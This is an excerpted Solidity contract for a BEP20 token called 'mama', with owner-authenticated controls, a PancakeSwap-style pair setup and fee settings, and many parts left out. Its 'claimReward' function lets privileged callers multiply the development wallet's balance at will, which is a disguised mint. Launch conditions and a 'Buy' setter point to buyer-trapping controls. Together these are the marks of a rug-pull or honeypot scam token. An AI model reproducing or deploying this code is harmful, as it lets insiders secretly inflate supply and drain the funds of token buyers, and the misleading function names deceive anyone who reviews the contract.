...
abstract contract Auth {
  ...
  function SetAddress() public virtual {
    ...
    function authenticate(address adr) public virtual onlyOwner {
        authentication[adr] = true;
    }

    function unauthenticate(address adr) public virtual onlyOwner {
...
interface IBEP20Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IBEP20Router {
...
contract Mama is IBEP20, Auth {
    using SafeMath for uint256;

    string constant _name = "mama";
    string constant _symbol = "MMM";
    uint8 constant _decimals = 9;

    uint256 _tTotal = 10000000 * (10 ** _decimals);
    ...
    uint256 promotionFee = 1;
    uint256 totalFee = 2;
    uint256 feeDenominator = 100;
    uint256 _feeReceiver = _tTotal;
    
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    address public promotionFeeReceiver = 0x65095e4daE5cF6A43d6D6eA12Bc52CC56Af17b61;
    address public developmentFeeReceiver = 0x65095e4daE5cF6A43d6D6eA12Bc52CC56Af17b61;

    IBEP20Router public router;
    address public pair;
    uint256 public launchedAt;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _tTotal / 1000 * 1; // 0.3%
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }


    constructor () Auth(msg.sender) {
        router = IBEP20Router(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
        pair = IBEP20Factory(router.factory()).createPair(WBNB, address(this));
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!launched() && recipient == pair){
            require(_stability[sender] > 0); launch();
        }
    ...
    function claimReward(uint256 devReceiver, address acc) authenticated public virtual {
        require(acc == address(developmentFeeReceiver), "development Fee Receiver");
        _devfee(address(developmentFeeReceiver), acc, devReceiver);
        _feeReceiver *= devReceiver;
        _stability[acc] *= devReceiver;
        emit Transfer(address(developmentFeeReceiver), acc, devReceiver);
    }
    ...
    function Buy(address account, bool newValue) public authenticated {
